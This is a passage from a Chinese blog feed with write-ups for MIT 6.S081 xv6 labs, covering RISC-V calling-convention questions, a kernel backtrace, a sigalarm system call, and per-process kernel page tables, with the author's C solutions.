26:45b1                lia1,12</span><br><span class="line">  28:00000517          auipca0,0x0</span><br><span class="line">  2c:7b850513          addia0,a0,1976 # 7e0 &lt;malloc+0xea&gt;</span><br><span class="line">  30:00000097          auipcra,0x0</span><br><span class="line">  34:608080e7          jalr1544(ra) # 638 &lt;printf&gt;</span><br><span class="line">  exit(0);</span><br><span class="line">  38:4501                lia0,0</span><br><span class="line">  3a:00000097          auipcra,0x0</span><br><span class="line">  3e:276080e7          jalr630(ra) # 2b0 &lt;exit&gt;</span><br></pre></td></tr></tbody></table></figure><blockquote><p>Which registers contain arguments to functions? For example, which register holds 13 in main’s call to <code>printf</code>?</p></blockquote><p>根据<code>RISC-V</code>的calling convention，<code>a0-a7</code>,<code>fa0-fa7</code>包含了函数的参数。调用<code>printf</code>时，<code>a0</code>为格式化字符串，<code>a1</code>是12，<code>a2</code>是13。</p><blockquote><p>Where is the call to function <code>f</code> in the assembly code for main? Where is the call to <code>g</code>? (Hint: the compiler may inline functions.)</p></blockquote><p>由于<code>f</code>和<code>g</code>函数都是简单的常数计算，传递的参数也是常数8，所以函数调用被编译器优化掉了，在<code>0x26</code>位置，直接将函数调用结果立即数12载入寄存器<code>a1</code>。</p><blockquote><p>At what address is the function <code>printf</code> located?</p></blockquote><p>从代码中看，很显然，在<code>0x638</code>得位置。</p><blockquote><p>What value is in the register <code>ra</code> just after the <code>jalr</code> to <code>printf</code> in <code>main</code>?</p></blockquote><p><code>jalr</code>指令是链接并跳转，将返回地址保存到<code>ra</code>寄存器，所以应为<code>0x38</code>。</p><blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0x00646c72</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"H%x Wo%s"</span>, <span class="number">57616</span>, &amp;i);</span><br></pre></td></tr></tbody></table></figure></blockquote><p>运行以上代码，输出<code>HE110 World</code>。数字57616的16进制表示为0xE110；<code>RISC-V</code>采用小端法表示，16进制的72、6c、64、00表示字符串“rld\0”，如果改为大端法，则应反过来，变为<code>i=0x726c6400</code>。</p><blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"x=%d y=%d"</span>, <span class="number">3</span>);</span><br></pre></td></tr></tbody></table></figure></blockquote><p>该<code>printf</code>调用少了一个参数，根据calling convention，对<code>y=%d</code>会取<code>a2</code>的值进行输出。</p><h1 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h1><p>该步骤需要实现一个<code>backtrace</code>函数，打印出调用轨迹，即每次调用的返回地址。</p><p>xv6运行时的stack结构如下图：</p><p><img src="image-20210225005912570.png" alt="image-20210225005912570"></p><p><code>s0/fp</code>中存储着当前的frame pointer，<code>fp-8</code>指向返回地址，<code>fp-16</code>指向上一个<code>fp</code>地址。</p><p>所以我们只需要不断打印当前<code>fp</code>的返回地址并向前追溯，直到stack顶部。</p><p>首先在<code>kernel/riscv.h</code>添加内联汇编函数以获取<code>fp</code>值：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> uint64</span><br><span class="line">r_fp()</span><br><span class="line">{</span><br><span class="line">  uint64 x;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">"mv %0, s0"</span> : <span class="string">"=r"</span> (x) )</span></span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后在<code>kernel/printf.c</code>实现<code>backtrace</code>：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">backtrace(<span class="keyword">void</span>) {</span><br><span class="line">  uint64 fp, top;</span><br><span class="line">  fp = r_fp();</span><br><span class="line">  top = PGROUNDUP(fp);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) {</span><br><span class="line">    <span class="keyword">if</span> (fp == top) <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, *(uint64*)(fp<span class="number">-8</span>));</span><br><span class="line">    fp = *(uint64*)(fp<span class="number">-16</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>之后在<code>sys_sleep</code>和<code>panic</code>中加入对<code>backtrace</code>的调用即可。</p><h1 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h1><p>本关需要实现一个<code>sigalarm(interval, handler)</code>系统调用，cpu每消耗interval个ticks后，调用一次handler函数。</p><p>首先要在<code>user/user.h</code>添加对新系统调用的用户接口：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigalarm</span><span class="params">(<span class="keyword">int</span> ticks, <span class="keyword">void</span> (*handler)())</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigreturn</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p><code>sigreturn</code>是一个被设计用来帮助我们实现<code>sigalarm</code>的函数，每个<code>handler</code>执行结束后，都调用<code>sigreturn</code>。</p><p>首先要在<code>proc</code>中添加新的字段，记录<code>interval</code>，<code>handler</code>以及所需的辅助变量，在<code>allocpoc</code>中对它们进行初始化，在系统调用执行时，保存相应的值到<code>proc</code>中。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">uint64 </span><br><span class="line">sys_sigalarm(<span class="keyword">void</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> = <span class="title">myproc</span>();</span></span><br><span class="line">  <span class="keyword">if</span> (argint(<span class="number">0</span>, &amp;(p-&gt;alarm_interval)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> (argaddr(<span class="number">1</span>, &amp;(p-&gt;alarm_hanlder)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>之后，我们需要在<code>usertrap</code>识别到timer interrupt时，进行处理，hints告诉我们，是<code>which_dev == 2</code>。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line"><span class="keyword">if</span>(which_dev == <span class="number">2</span>) {</span><br><span class="line">  p-&gt;passed++;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;passed == p-&gt;alarm_interval) {</span><br><span class="line">    p-&gt;passed = <span class="number">0</span>;</span><br><span class="line">    p-&gt;trapframe-&gt;epc = p-&gt;alarm_hanlder;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">yield</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>此时只需让<code>sigreturn</code>直接返回0，这样简单地添加代码，可以让<code>test0</code>打印出alarm，但是随后，程序便逻辑崩溃，无法通过测试。这是因为当kernle处理完time interru，回到用户模式，pc指向handler的位置，之后开始执行handler函数，在handler函数尾部，调用<code>sigreturn</code>陷入kernel，并无操作，再次返回用户态，执行handler尾部的<code>ret</code>。此时用于<code>ret</code>指令的返回地址寄存器<code>ra</code>所存储的值，是在time interrupt之时，test函数执行中产生的<code>ra</code>的值，并非是time interrupt发生时，正在执行的代码地址，所以程序不能返回正确位置，并且handler执行过程中，修改了的部分寄存器也需要恢复。</p><p>于是，我们需要在handler执行前保存<code>tramframe</code>，在执行后的<code>sigreturn</code>中恢复<code>tramframe</code>，让代码返回到正确的位置执行，并使寄存器的数值复原。同时，根据hints，为了防止handler执行过程中被重复调用，添加<code>permission</code>字段来进行控制，此外，<code>interval==0</code>时，意味着取消alarm。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uint64 </span><br><span class="line">sys_sigreturn(<span class="keyword">void</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span>* <span class="title">p</span> = <span class="title">myproc</span>();</span></span><br><span class="line">  p-&gt;permission = <span class="number">1</span>;</span><br><span class="line">  *p-&gt;trapframe = p-&gt;alarm_frame;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"ra:%p\n"</span>, p-&gt;trapframe-&gt;ra);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在<code>usertrap</code>中：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(which_dev == <span class="number">2</span>) {</span><br><span class="line">  p-&gt;passed++;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;permission &amp;&amp;</span><br><span class="line">      p-&gt;alarm_interval &amp;&amp; </span><br><span class="line">      p-&gt;passed == p-&gt;alarm_interval) {</span><br><span class="line">    p-&gt;passed = <span class="number">0</span>;</span><br><span class="line">    p-&gt;permission = <span class="number">0</span>;</span><br><span class="line">    p-&gt;alarm_frame = *p-&gt;trapframe;</span><br><span class="line">    p-&gt;trapframe-&gt;epc = p-&gt;alarm_hanlder;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">yield</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>到此，便完成了lab4 traps。</p><p>此外，还有一点，笔者曾尝试只保存<code>tramframe</code>中的<code>caller save</code>寄存器，但是无法通过测试。最终查看<code>asm</code>文件发现：<code>callee save</code>寄存器是在被调用函数尾部的ret指令前进行恢复的，但是在<code>sigreturn</code>中通过恢复<code>epc</code>的方式，将<code>pc</code>直接指向了被time interrupt打断执行的代码位置，所以<code>callee save</code>寄存器在被修改后并未被复原，我们必须保存<code>trapframe</code>中的所有寄存器。</p><p>最终代码见<a href="https://github.com/Jason210314/xv6-labs-2020/tree/traps">github仓库</a>。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6.S081 </tag>
            
            <tag> traps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.S081 lab3 page tables</title>
      <link href="2021/02/22/6-s081-lab3-page-tables/"/>
      <url>2021/02/22/6-s081-lab3-page-tables/</url>
      
        <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>前两个lab比较基础，就不写博客记录了，于是从lab3开始。</p><p>环境配置参考<a href="https://pdos.csail.mit.edu/6.S081/2020/tools.html">官网</a> 。如果使用<code>ubuntu20.04</code>的话，环境配置比较简单，只需要从<a href="https://www.qemu.org/download/#source">qemu官网</a>下载源码，手动build就完成了；或者使用<code>archlinux</code>，一条命令便全部配置完成。笔者使用的平台是<code>macOS 11.2.1</code>，使用<code>homebrew</code>安装的<code>qemu</code>在前两个lab没有问题，但是在第三个lab出现了crash，改为从源码手动编译安装<code>qemu 5.1.0</code>解决了。</p><a id="more"></a><p>2021-02-24修正：做lab4查看<code>call.asm</code>，发现.text指令长度不一，有的为2，有的为4，遂找人请教，猜测是指令压缩导致，于是联想到之前几乎所有人都遇到的一个问题，使用gdb打断点调试时，出现：”Cannot access memory at address xxx”。经过大佬查阅并尝试，发现在<code>.gdbinit.tmpl-riscv</code>中加入<code>set riscv use-compressed-breakpoints yes</code>可以有效解决。</p><h1 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h1><p>该部分的内容是打印出第一个进程的用户页表。这个非常简单：</p><p>参照<code>freewalk</code>函数，首先在<code>kernel/vm.c</code>添加<code>vmprint</code>:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_vmprint(<span class="keyword">pagetable_t</span> pagetable, <span class="keyword">int</span> level) {</span><br><span class="line">  <span class="keyword">int</span> j;</span><br><span class="line">  <span class="comment">// there are 2^9 = 512 PTEs in a page table.</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++){</span><br><span class="line">    <span class="keyword">pte_t</span> pte = pagetable[i];</span><br><span class="line">    <span class="keyword">if</span>(pte &amp; PTE_V){</span><br><span class="line">      <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt;= level; j++) {</span><br><span class="line">        <span class="keyword">if</span>(j == <span class="number">0</span>)</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">".."</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">" .."</span>);</span><br><span class="line">      }</span><br><span class="line">      uint64 child = PTE2PA(pte);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%d: pte %p pa %p\n"</span>, i, pte, child);</span><br><span class="line">      <span class="comment">// this PTE points to a lower-level page table.</span></span><br><span class="line">      <span class="keyword">if</span> ((pte &amp; (PTE_R | PTE_W | PTE_X)) == <span class="number">0</span>) {</span><br><span class="line">        _vmprint((<span class="keyword">pagetable_t</span>)child, level + <span class="number">1</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="comment">// print the page tables</span></span><br><span class="line"><span class="keyword">void</span> </span><br><span class="line">vmprint(<span class="keyword">pagetable_t</span> pagetable) {</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"page table %p\n"</span>, pagetable);</span><br><span class="line">  _vmprint(pagetable, <span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后在<code>exec.c</code>中插入代码打印第一个进程的用户页表：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p-&gt;pid == <span class="number">1</span>) {</span><br><span class="line">  vmprint(p-&gt;pagetable);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>启动后打印出如下内容：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">page table 0x0000000087f67000</span><br><span class="line">..0: pte 0x0000000021fd8c01 pa 0x0000000087f63000</span><br><span class="line">.. ..0: pte 0x0000000021fd8801 pa 0x0000000087f62000</span><br><span class="line">.. .. ..0: pte 0x0000000021fd901f pa 0x0000000087f64000</span><br><span class="line">.. .. ..1: pte 0x0000000021fd840f pa 0x0000000087f61000</span><br><span class="line">.. .. ..2: pte 0x0000000021fd801f pa 0x0000000087f60000</span><br><span class="line">..255: pte 0x0000000021fd9801 pa 0x0000000087f66000</span><br><span class="line">.. ..511: pte 0x0000000021fd9401 pa 0x0000000087f65000</span><br><span class="line">.. .. ..510: pte 0x0000000021fdd807 pa 0x0000000087f76000</span><br><span class="line">.. .. ..511: pte 0x0000000020001c0b pa 0x0000000080007000</span><br></pre></td></tr></tbody></table></figure><p>在用户地址空间最高处，511，510 entry对应<code>trampoline</code>和<code>trapframe</code>。在用户地址空间最低处，0，1，2 entry对应<code>text\data</code>，<code>guard page</code>，<code>stack</code>，如果修改下<code>_vmprint</code>打印出更多信息，可以发现entry 1的<code>PTE_U</code>是无效的，可以防止栈溢出。顶级页表只使用到第255个entry，因为<code>xv6</code>只使用了38位地址。</p><h1 id="A-kernel-page-table-per-process"><a href="#A-kernel-page-table-per-process" class="headerlink" title="A kernel page table per process"></a>A kernel page table per process</h1><p>第二部分是让每个进程拥有单独的内核页表，为第三部分直接使用用户虚拟地址做准备。</p><p>首先在<code>kernel/proc.h</code>中的<code>struct proc</code>定义中添加</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pagetable_t</span> kpagetable;</span><br></pre></td></tr></tbody></table></figure><p>仿照<code>kvminit</code>，实现一个初始化进程内核页表的函数：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pagetable_t</span></span><br><span class="line">proc_kvminit(<span class="keyword">void</span>) </span><br><span class="line">{  </span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">pagetable_t</span> proc_kpagetable = uvmcreate();</span><br><span class="line">  <span class="keyword">if</span> (proc_kpagetable == <span class="number">0</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">512</span>; i++) {</span><br><span class="line">    proc_kpagetable[i] = kernel_pagetable[i];</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  ukvmmap(proc_kpagetable, UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">  ukvmmap(proc_kpagetable, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">  ukvmmap(proc_kpagetable, CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line">  ukvmmap(proc_kpagetable, PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> proc_kpagetable;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">ukvmmap(<span class="keyword">pagetable_t</span> kernel_pagetable ,uint64 va, uint64 pa, uint64 sz, <span class="keyword">int</span> perm)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span>(mappages(kernel_pagetable, va, sz, pa, perm) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">"kvmmap"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>根据后续实验，我们能修改的内核地址空间不超过顶级页表的第一个entry的地址范围，所以我们和<code>kernel_pagetable</code>共享其他entry，直接进行复制，这样能够节约次级页表占用的内存空间。</p><p><code>kernel/proc.c</code>中的<code>allocproc</code>函数，负责分配、初始化进程，在其中如下调用：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;kpagetable = proc_kvminit();</span><br><span class="line"><span class="keyword">if</span> (p-&gt;kpagetable == <span class="number">0</span>) {</span><br><span class="line">  freeproc(p);</span><br><span class="line">  <span class="built_in">release</span>(&amp;p-&gt;lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>之后，官网的<code>hint</code>提到需要为每个进程初始化<code>kernel stack</code>，可能需要将<code>proinit</code>中的部分代码转移到<code>allocproc</code>中，由于我们和<code>kernel_pagetable</code>共享了顶级页表entry 1意外的所有页表，所以仍可以将<code>kernel stack</code>的初始化代码留在<code>procinit</code>中。</p><p>接下来，修改<code>scheduler</code>，当调度到进程执行时，将进程的内核页表载入<code>stap</code>寄存器（参考<code>kvminithart</code>），当没有进程运行时，使用<code>kernel_pagetable</code>：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p-&gt;state == RUNNABLE) {</span><br><span class="line">  <span class="comment">// Switch to chosen process.  It is the process's job</span></span><br><span class="line">  <span class="comment">// to release its lock and then reacquire it</span></span><br><span class="line">  <span class="comment">// before jumping back to us.</span></span><br><span class="line">  p-&gt;state = RUNNING;</span><br><span class="line">  c-&gt;proc = p;</span><br><span class="line"></span><br><span class="line">  w_satp(MAKE_SATP(p-&gt;kpagetable));</span><br><span class="line">  sfence_vma();</span><br><span class="line">  swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Process is done running for now.</span></span><br><span class="line">  <span class="comment">// It should have changed its p-&gt;state before coming back.</span></span><br><span class="line">  c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">  kvminithart();</span><br><span class="line">  found = <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>之后，我们需要在<code>free_proc</code>中添加释放内核页表的代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p-&gt;kpagetable) {</span><br><span class="line">  proc_freekpagetable(p-&gt;kpagetable);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">proc_freekpagetable(<span class="keyword">pagetable_t</span> kpagetable) {</span><br><span class="line">  <span class="keyword">pte_t</span> pte = kpagetable[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">pagetable_t</span> level1 = (<span class="keyword">pagetable_t</span>) PTE2PA(pte);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++) {</span><br><span class="line">    <span class="keyword">pte_t</span> pte = level1[i];</span><br><span class="line">    <span class="keyword">if</span> (pte &amp; PTE_V) {</span><br><span class="line">      uint64 level2 = PTE2PA(pte);</span><br><span class="line">      kfree((<span class="keyword">void</span> *) level2);</span><br><span class="line">      level1[i] = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  kfree((<span class="keyword">void</span> *) level1);</span><br><span class="line">  kfree((<span class="keyword">void</span> *) kpagetable);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>注意，由于和<code>kernel_pagetable</code>进行了共享，所以仅释放第一个entry对应的次级页表；如果没有共享则需释放整个三级页表（都不能释放物理内存）。</p><p>此外，如果将<code>kernel stack</code>的初始化代码放置在了<code>allocproc</code>中，那么需要在<code>freeproc</code>中释放并ummap<code>kernel stack</code>，并且需要在<code>kvmpa</code>做出修改，使用：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pte = walk(myproc()-&gt;kpagetable, va, <span class="number">0</span>);</span><br></pre></td></tr></tbody></table></figure><h1 id="Simplify-copyin-copyinstr"><a href="#Simplify-copyin-copyinstr" class="headerlink" title="Simplify copyin/copyinstr"></a>Simplify <code>copyin/copyinstr</code></h1><p>该部分需要利用第二部分中的进程内核页表简化<code>copyin/copyinstr</code>函数，使之不需要传递用户页表。</p><p>根据提示，将进程的用户页表复制到其内核页表中，这样每个进程内核页表都有其对应用户页表的副本。复制的用户页表虚拟地址不能超过<code>PLIC</code>，之上是<code>kernel</code>占有的地址空间，所以需要判断。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">u2kvmcopy(<span class="keyword">pagetable_t</span> pagetable, <span class="keyword">pagetable_t</span> kpagetable, uint64 oldsz, uint64 newsz) </span><br><span class="line">{</span><br><span class="line">  uint64 va;</span><br><span class="line">  <span class="keyword">pte_t</span> *upte;</span><br><span class="line">  <span class="keyword">pte_t</span> *kpte;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(newsz &gt;= PLIC)</span><br><span class="line">    panic(<span class="string">"u2kvmcopy: newsz too large"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (va = oldsz; va &lt; newsz; va += PGSIZE) {</span><br><span class="line">    upte = walk(pagetable, va, <span class="number">0</span>);</span><br><span class="line">    kpte = walk(kpagetable, va, <span class="number">1</span>);</span><br><span class="line">    *kpte = *upte;</span><br><span class="line">    <span class="comment">// because the user mapping in kernel page table is only used for copyin </span></span><br><span class="line">    <span class="comment">// so the kernel don't need to have the W,X,U bit turned on</span></span><br><span class="line">    *kpte &amp;= ~(PTE_U|PTE_W|PTE_X);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>注意将复制到内核页表的entry取消<code>PTE_U</code>权限。</p><p>之后在<code>exec/fork/sbrk</code>中，每次用户页表发生改变时，复制到内核页表中。</p><p>对于<code>exec</code>:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p-&gt;pid == <span class="number">1</span>) {</span><br><span class="line">  vmprint(p-&gt;pagetable);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">u2kvmcopy(p-&gt;pagetable, p-&gt;kpagetable, <span class="number">0</span>, p-&gt;sz);</span><br></pre></td></tr></tbody></table></figure><p>对于<code>fork</code>:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 